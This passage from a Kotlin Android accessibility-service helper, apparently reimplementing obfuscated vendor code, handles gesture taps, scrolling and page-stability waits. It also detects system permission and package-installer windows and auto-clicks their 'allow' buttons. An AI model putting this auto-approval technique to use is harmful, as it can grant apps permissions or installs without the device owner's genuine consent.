                    className.contains("Compound", ignoreCase = true)
                ) {
                    return node
                }
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val found = findFirstToggleRecursive(child, depth + 1, maxDepth)
                if (found != null) return found
            }
        } catch (_: Exception) { /* swallow per vendor */ }
        return null
    }

    /**
     * Get app label from PackageManager.
     * Matches vendor m212137c1().
     */
    fun getAppLabel(): String {
        return try {
            val pm = context.packageManager
            val appInfo = pm.getApplicationInfo(context.packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) {
            context.packageName
        }
    }

    /**
     * Navigate back via global action.
     * Matches vendor m212138c2().
     */
    fun pressBack() {
        try {
            service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
        } catch (e: Exception) {
            Log.w(TAG, "返回失败: ${e.message}")
        }
    }

    /**
     * Dispatch a gesture tap at the center of a node's bounds.
     * Uses 100ms stroke duration per vendor pattern.
     */
    fun dispatchGestureClick(node: android.view.accessibility.AccessibilityNodeInfo): Boolean {
        return try {
            val rect = android.graphics.Rect()
            node.getBoundsInScreen(rect)
            if (rect.width() <= 0 || rect.height() <= 0) return false
            dispatchGestureClick(rect.centerX().toFloat(), rect.centerY().toFloat())
            true
        } catch (_: Exception) { false }
    }

    /** Dispatch gesture click at coordinates. Vendor m212123a2: duration 100ms. */
    private fun dispatchGestureClick(x: Float, y: Float) {
        val path = android.graphics.Path()
        path.moveTo(x, y)
        val gesture = android.accessibilityservice.GestureDescription.Builder()
            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 100L))
            .build()
        service?.dispatchGesture(gesture, null, null)
    }

    /**
     * Scroll forward in the current view. Finds first scrollable node and performs ACTION_SCROLL_FORWARD.
     */
    fun scrollForward(root: android.view.accessibility.AccessibilityNodeInfo): Boolean {
        val scrollable = findScrollableNode(root)
        if (scrollable != null) {
            return scrollable.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
        }
        return false
    }

    /** Find first scrollable node in tree. */
    private fun findScrollableNode(node: android.view.accessibility.AccessibilityNodeInfo): android.view.accessibility.AccessibilityNodeInfo? {
        if (node.isScrollable) return node
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            if (child.isScrollable) return child
            val found = findScrollableNode(child)
            if (found != null) {
                child.recycle()
                return found
            }
            child.recycle()
        }
        return null
    }

    /**
     * Check if current root window is a permission controller.
     * Matches vendor m212139c3(): checks root package against known permission controllers.
     */
    fun isPermissionControllerWindow(): Boolean {
        val root = service?.rootInActiveWindow ?: return false
        val pkg = root.packageName?.toString() ?: ""
        return pkg.contains("com.android.permissioncontroller") ||
            pkg.contains("com.google.android.permissioncontroller") ||
            pkg.contains("com.android.packageinstaller") ||
            pkg.contains("com.google.android.packageinstaller")
    }

    /**
     * Try to click any visible permission allow button.
     * Matches vendor m212122a0(): iterates PERMISSION_ALLOW_IDS via findAccessibilityNodeInfosByViewId.
     */
    fun clickPermissionAllowButton(): Boolean {
        val root = service?.rootInActiveWindow ?: return false
        for (buttonId in PERMISSION_ALLOW_IDS) {
            try {
                val nodes = root.findAccessibilityNodeInfosByViewId(buttonId)
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    try {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        node.recycle()
                        return true
                    } catch (_: Exception) { /* continue */ }
                }
            } catch (_: Exception) { /* continue */ }
        }
        return false
    }

    // ── Internal helpers ─────────────────────────────────────────────

    /**
     * Check if className represents a toggle widget.
     * Vendor b7 checks: Switch, Toggle, CheckBox, CompoundButton.
     */
    private fun isToggleClassName(className: String): Boolean {
        return className.contains("Switch") ||
            className.contains("Toggle") ||
            className.contains("CheckBox") ||
            className.contains("CompoundButton")
    }

    /**
     * Xiaomi brand check. Matches vendor m212120c4():
     * Build.BRAND or Build.MANUFACTURER in {xiaomi, redmi, poco}.
     */
    internal fun isXiaomiBrand(): Boolean {
        val brand = Build.BRAND.lowercase()
        val manufacturer = Build.MANUFACTURER.lowercase()
        val xiaomiBrands = listOf("xiaomi", "redmi", "poco")
        return xiaomiBrands.contains(brand) || xiaomiBrands.contains(manufacturer)
    }

    // ── Wait utilities (vendor m212294f9, m212272d6 pattern) ────────

    /**
     * Wait until the accessibility root window node count stabilizes.
     * Matches vendor waitForPageStable pattern used across all Steps classes.
     */
    private suspend fun waitForPageStable(
        requiredStableCount: Int = STABLE_REQUIRED_COUNT,
        pollIntervalMs: Long = STABLE_POLL_INTERVAL_MS,
        timeoutMs: Long = STABLE_TIMEOUT_MS
    ): Boolean {
        val startTime = System.currentTimeMillis()
        var lastNodeCount = -1
        var stableHits = 0

        while (System.currentTimeMillis() - startTime < timeoutMs) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            val nodeCount = if (root != null) countNodes(root) else 0
            try { root?.recycle() } catch (_: Exception) {}

            if (nodeCount == lastNodeCount && nodeCount > 0) {
                stableHits++
                if (stableHits >= requiredStableCount) {
                    Log.d(TAG, "[waitForPageStable] page stable (nodes=$nodeCount, hits=$stableHits)")
                    return true
                }
            } else {
                lastNodeCount = nodeCount
                stableHits = 0
            }
            interruptibleDelay(pollIntervalMs)
        }
        Log.d(TAG, "[waitForPageStable] timeout after ${timeoutMs}ms")
        return false
    }

    /**
     * Delay in small chunks (100ms) to stay responsive to cancellation.
     * Matches vendor interruptibleDelay pattern.
     */
    private suspend fun interruptibleDelay(totalMs: Long) {
        var remaining = totalMs
        while (remaining > 0) {
            val chunk = minOf(remaining, 100L)
            delay(chunk)
            remaining -= chunk
        }
    }

    /** Count total nodes in accessibility tree. Matches vendor m212239a7. */
    private fun countNodes(node: AccessibilityNodeInfo): Int {
        var count = 1
        try {
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                count += countNodes(child)
                try { child.recycle() } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return count
    }
}
